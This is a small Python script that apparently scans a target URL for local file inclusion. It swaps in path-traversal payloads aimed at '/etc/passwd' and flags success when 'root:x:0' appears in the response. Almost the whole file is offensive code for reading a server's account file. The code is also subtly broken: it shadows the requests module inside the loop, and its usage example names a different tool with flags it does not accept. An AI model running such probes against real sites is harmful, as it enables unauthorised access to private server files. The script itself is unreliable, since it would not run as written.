import requests
import sys


def LFI():
	'''
    Local File Inclusion 
    
    Here we try to accesss to passwd of the server where the webapp is running
    We use the url and the parameter, and we try to find the correct path with payloads.
    
    Parameters:    
        URL of your target website with the parameter (like "url?image=)
        {fuzz}, the word that will be replaced by payloads
        
    Returns:
    String --> Path to access to passwd
    
    Exemple : "python3 fuxploider.py --url https://awesomeFileUploadService.com --not-regex "wrong file type"
        
    '''
	if len(sys.argv) < 2:
		sys.exit("[-]ERROR - Missing target URL")
	elif not '{fuzz}' in sys.argv[1]:
		sys.exit("[-]ERROR - Missing {fuzz} parameter\nExemple : http://127.168.0.1/index.php?image=\{fuzz\}")
	else:
		selected_target = sys.argv[1]

	payloads = ['/etc/passwd','../etc/passwd','../../etc/passwd','../../../etc/passwd']

	for payload in payloads:
		target = selected_target.replace('{fuzz}', payload)
		requests = requests.get(target)
		if b"root:x:0" in requests.content:
			print("[+]SUCCESS - LFI vuln found with {}!".format(payload))
		else:
			pass
	print("[+]INFO - Scan finished")

if __name__ == '__main__':
	LFI()
